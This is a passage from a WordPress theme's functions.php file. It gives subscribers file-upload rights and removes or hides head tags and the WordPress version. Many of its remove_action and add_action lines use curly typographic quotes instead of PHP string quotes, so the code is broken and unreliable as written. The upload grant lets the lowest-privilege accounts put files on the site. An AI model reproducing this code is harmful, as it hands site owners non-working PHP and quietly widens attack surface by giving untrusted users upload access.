	$GLOBALS['post'] = $GLOBALS['post_temp'];
}

if ( current_user_can('subscriber') && !current_user_can('upload_files') )
  add_action('admin_init', 'allow_contributor_uploads');

function allow_contributor_uploads() {
  $subscriber = get_role('subscriber');
  $subscriber->add_cap('upload_files');
}


/**去除wordpress头部不必要的元素标签 **/ 
//remove_action( ‘wp_head’, ‘wp_enqueue_scripts’, 1 );   
remove_action( ‘wp_head’, ‘feed_links’, 2 );   
remove_action( ‘wp_head’, ‘feed_links_extra’, 3 );   
remove_action( ‘wp_head’, ‘rsd_link’ );   
remove_action( ‘wp_head’, ‘wlwmanifest_link’ );   
remove_action( ‘wp_head’, ‘index_rel_link’ );   
remove_action( ‘wp_head’, ‘parent_post_rel_link’, 10, 0 );   
remove_action( ‘wp_head’, ‘start_post_rel_link’, 10, 0 );   
remove_action( ‘wp_head’, ‘adjacent_posts_rel_link_wp_head’, 10, 0 );   
//remove_action( ‘wp_head’, ‘locale_stylesheet’ );   
remove_action( ‘publish_future_post’, ‘check_and_publish_future_post’, 10, 1 );   
//remove_action( ‘wp_head’, ‘noindex’, 1 );   
//remove_action( ‘wp_head’, ‘wp_print_styles’, 8 );   
//remove_action( ‘wp_head’, ‘wp_print_head_scripts’, 9 );   
remove_action( ‘wp_head’, ‘wp_generator’ );   
//remove_action( ‘wp_head’, ‘rel_canonical’ );   
remove_action( ‘wp_footer’, ‘wp_print_footer_scripts’ );   
remove_action( ‘wp_head’, ‘wp_shortlink_wp_head’, 10, 0 );   
remove_action( ‘template_redirect’, ‘wp_shortlink_header’, 11, 0 );  
 
add_action(‘widgets_init’, ‘my_remove_recent_comments_style’);   
function my_remove_recent_comments_style() {   
global $wp_widget_factory;   
remove_action(‘wp_head’, array($wp_widget_factory->widgets['WP_Widget_Recent_Comments'], ‘recent_comments_style’));   
}   

function wpbeginner_remove_version() {
return '';
}
add_filter('the_generator', 'wpbeginner_remove_version');






?>